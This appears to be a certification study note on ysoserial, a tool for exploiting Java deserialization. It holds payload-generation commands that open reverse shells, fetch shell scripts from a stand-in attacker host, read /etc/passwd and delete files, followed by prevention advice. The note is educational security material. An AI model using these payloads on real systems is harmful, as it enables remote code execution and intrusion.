2026-02-06 22:00

Status:

Tags: [[eWPTX]] [[Java]] [[Exploitation]] [[ysoserial]]
###### Prerequisites: [[Gadgets & Gadget Chains]] [[Java Serialization & Deserialization]]
# ysoserial (Overview)

## Overview

**ysoserial** is a Java-based tool designed to generate malicious serialized payloads that can be used to exploit insecure deserialization vulnerabilities.

It leverages known vulnerabilities in popular Java libraries (e.g., Apache Commons Collections, Spring, etc.) to create payloads that execute arbitrary commands during deserialization.

---

## How Ysoserial Works

![[Pics/deserialization/ysoserial-flow.svg]]

Ysoserial creates serialized payloads that trigger malicious behavior when deserialized by a vulnerable application.

---

## Installation

### Download

```bash
# Clone repository
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial

# Build with Maven
mvn clean package -DskipTests

# The JAR will be in target/ directory
```

### Download Pre-built

```bash
# From releases (if available)
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-0.0.6-all.jar
```

---

## Basic Usage

### List Available Gadgets

```bash
java -jar ysoserial.jar
```

Output:

```
Y SO SERIAL?
Usage: java -jar ysoserial.jar [gadget] [command]
Available gadget chains:
  BeanShell1
  C3P0
  CommonsBeanutils1
  CommonsCollections1
  CommonsCollections2
  CommonsCollections3
  CommonsCollections4
  CommonsCollections5
  CommonsCollections6
  Groovy1
  Hibernate1
  Hibernate2
  Javaserialized
  Jdk7u21
  Jre8u20
  MozillaRhino1
  MozillaRhino2
  Myfaces1
  Myfaces2
  ROME
  Spring1
  Spring2
  ...
```

### Generate a Payload

```bash
java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.ser
```

This generates a payload that executes the `whoami` command when deserialized.

---

## Common Gadget Chains

### CommonsCollections1

The most famous and widely used gadget chain.

```bash
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com" > payload.ser
```

**Target**: Apache Commons Collections 3.1 - 3.2.1

**Requirements**:
- Commons Collections library in classpath
- No security manager blocking reflection

### CommonsCollections2

Alternative chain that doesn't use `InvokerTransformer`.

```bash
java -jar ysoserial.jar CommonsCollections2 "wget http://attacker.com/shell.sh" > payload.ser
```

### CommonsCollections3

Uses `TemplatesImpl` for code execution.

```bash
java -jar ysoserial.jar CommonsCollections3 "touch /tmp/pwned" > payload.ser
```

### CommonsCollections4

Uses `InstantiateTransformer` instead of `InvokerTransformer`.

```bash
java -jar ysoserial.jar CommonsCollections4 "nc -e /bin/sh attacker.com 4444" > payload.ser
```

### CommonsCollections5

Uses `BadAttributeValueExpException` as entry point.

```bash
java -jar ysoserial.jar CommonsCollections5 "rm -rf /tmp/test" > payload.ser
```

### CommonsCollections6

Uses `HashSet` to trigger the chain.

```bash
java -jar ysoserial.jar CommonsCollections6 "cat /etc/passwd" > payload.ser
```

---

## Framework-Specific Chains

### Spring1

```bash
java -jar ysoserial.jar Spring1 "whoami" > payload.ser
```

### Spring2

```bash
java -jar ysoserial.jar Spring2 "id" > payload.ser
```

### Hibernate1 / Hibernate2

```bash
java -jar ysoserial.jar Hibernate1 "ping attacker.com" > payload.ser
```

---

## Using ysoserial in Penetration Testing

### 1. Base64 Encode for HTTP

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64 | tr -d '\n'
```

```bash
# Use in curl request
curl -X POST http://target.com/api \
  -H "Content-Type: application/octet-stream" \
  --data-binary "$(cat payload.ser)"
```

### 2. Create Reverse Shell

```bash
# Start listener
nc -lvnp 4444

# Generate payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" > payload.ser
```

### 3. Test for Vulnerability

```bash
# Simple test with DNS callback
java -jar ysoserial.jar CommonsCollections1 "nslookup test.attacker.com" > payload.ser
```

---

## Detecting Which Gadget to Use

### Method 1: Error Messages

Deserialization errors often reveal loaded libraries:

```
java.lang.ClassNotFoundException: org.apache.commons.collections.functors.InvokerTransformer
```

### Method 2: Enumerate Classpath

If you have partial code execution or file read:

```bash
# Check for Commons Collections
find / -name "commons-collections*.jar" 2>/dev/null

# Check version
unzip -p commons-collections-3.2.1.jar META-INF/MANIFEST.MF | grep Version
```

### Method 3: Try Common Chains

Start with most common:

1. CommonsCollections1 (most reliable)
2. CommonsCollections2 (if InvokerTransformer blocked)
3. CommonsCollections3 (alternative entry point)
4. Spring1/Spring2 (if Spring is present)
5. Jdk7u21/Jre8u20 (version-specific)

---

## ysoserial Variants and Forks

### ysoserial-net

.NET version for exploiting .NET deserialization:

https://github.com/pwntester/ysoserial.net

```bash
ysoserial.exe -g ObjectDataProviderGenerator -c "calc.exe" -o base64
```

### ysoserial-for-weblogic

Specific for WebLogic exploits:

https://github.com/ambiguouscience/ysoserial-modified-weblogic

---

## Testing Locally

### Vulnerable Test Application

```java
import java.io.*;
import java.util.Base64;

public class VulnerableApp {
    public static void main(String[] args) throws Exception {
        String base64Payload = "rO0ABX..."; // Your payload here
        byte[] decoded = Base64.getDecoder().decode(base64Payload);

        ObjectInputStream in = new ObjectInputStream(
            new ByteArrayInputStream(decoded)
        );

        in.readObject();  // Boom!
    }
}
```

### Test with ysoserial

```bash
# Terminal 1: Start netcat listener
nc -lvnp 8000

# Terminal 2: Generate and test
java -jar ysoserial.jar CommonsCollections1 "curl http://localhost:8000" | \
  base64 | tr -d '\n' > payload.b64

# Terminal 3: Run vulnerable app with payload
java VulnerableApp $(cat payload.b64)
```

---

## Prevention

### For Developers

1. **Do not use Java serialization** with untrusted data
2. **Keep dependencies updated** - use patched versions of libraries
3. **Implement class filtering**:

```java
// Java 9+ JEP 290
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "!org.apache.commons.collections.*"  // Block Commons Collections
);
ObjectInputFilter.setFilter(filter);
```

4. **Use safe formats** (JSON, XML)

### For Defenders

1. **Monitor deserialization** - log all `readObject()` calls
2. **Scan dependencies** - use OWASP Dependency-Check
3. **Runtime protection** - use agents like contrast-rO0
4. **Network monitoring** - detect serialized magic bytes (`ac ed 00 05`)

---

## Key Points

- ysoserial generates malicious Java serialized payloads
- Contains modules for various libraries (CommonsCollections, Spring, etc.)
- Primary tool for exploiting Java insecure deserialization
- Use in authorized testing only
- Defense: update libraries, use safe formats, implement filtering

---

## References

- ysoserial GitHub: https://github.com/frohoff/ysoserial
- ysoserial.net (.NET version): https://github.com/pwntester/ysoserial.net
- Java Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- "How to hunt for RCE in 2020" (Alvaro Muñoz & Oleksandr Mirosh): https://slidingsec.github.io/blog/2020/09/12/how-to-hunt-rce-2020/
